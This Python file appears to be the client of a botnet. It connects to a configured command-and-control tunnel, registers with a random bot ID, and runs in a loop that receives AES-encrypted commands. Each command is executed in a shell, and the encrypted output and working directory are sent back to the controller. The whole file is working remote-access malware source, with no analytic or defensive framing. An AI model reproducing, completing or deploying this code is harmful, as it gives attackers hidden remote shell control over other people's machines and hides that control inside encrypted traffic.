import os
import subprocess
from prototype import BotnetInterface, CryptoUtils, Envelope, socket, AF_INET, SOCK_STREAM, random, hashlib


class Bot:
    bot_id: str
    interface: BotnetInterface
    online: bool
    notified: bool
    config = dict
    cipher: None

    def __init__(self):
        self.interface = BotnetInterface(insocket=None, outsocket=socket(AF_INET, SOCK_STREAM), self_type="Bot")
        self.interface.populate()
        self.config = self.interface.config
        self.cipher = CryptoUtils.new(self.config.get("settings").get("secret"))
        self.bot_id = hashlib.md5(hashlib.sha1(random.random().hex().encode()).hexdigest().encode()).hexdigest()

    def connect(self):
        tunnel = self.config.get('tunnel')
        self.online = self.interface.connect((tunnel.get("url"), tunnel.get("port")))

    def send(self, data=None):
        self.interface.send(data=data)

    def receive(self):
        data = self.interface.receive()
        return data

    def __notify__(self):
        envelope = Envelope(data=self.bot_id)
        self.send(data=envelope)
        gotcha = self.receive()
        self.notified = gotcha.DataText

    def terminate(self):
        self.interface.outgoing.close()

    def run(self):
        while True:
            self.interface.outgoing.settimeout(None)
            self.connect()
            self.__notify__()
            envelope = Envelope(data='slave')
            self.send(data=envelope)
            while self.online and self.notified:
                cmd = None
                envelope: Envelope = self.receive()
                decrypted = CryptoUtils.decode_aes(self.cipher, envelope.DataText)
                if 'terminate' in decrypted:
                    envelope = Envelope(data=self.bot_id+":terminated")
                    self.send(data=envelope)
                    self.terminate()
                    exit(1)

                elif 'quit' in decrypted:
                    envelope = Envelope(data=self.bot_id+":slave")
                    self.send(envelope)
                    continue

                elif decrypted.startswith("cd "):
                    dest = decrypted[3:]
                    try:
                        os.chdir(dest)
                    except OSError:
                        pass
                    cmd = "cd ."

                else:
                    cmd = decrypted
                proc = subprocess.Popen(
                    [cmd],
                    shell=True,
                    stderr=subprocess.PIPE,
                    stdout=subprocess.PIPE,
                    stdin=subprocess.PIPE
                    )
                stdout = proc.stderr.read() + proc.stdout.read()
                encrypted = CryptoUtils.encode_aes(self.cipher, os.getcwd()+">\n" + stdout.decode())
                envelope = Envelope(data=encrypted)
                self.send(data=envelope)
